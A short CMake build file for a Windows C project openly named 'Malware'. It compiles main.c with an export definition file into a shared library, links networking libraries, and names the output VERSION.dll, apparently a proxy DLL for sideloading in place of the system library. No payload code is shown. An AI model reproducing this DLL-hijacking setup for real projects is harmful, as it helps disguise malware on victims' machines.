cmake_minimum_required(VERSION 3.20)
project(Malware C)

set(CMAKE_C_STANDARD 11)

add_library(Malware SHARED main.c exports.def)

target_link_libraries(Malware
    winhttp
    ws2_32
    iphlpapi
    version
)

set_target_properties(Malware PROPERTIES
    OUTPUT_NAME "VERSION"
    SUFFIX ".dll"
)
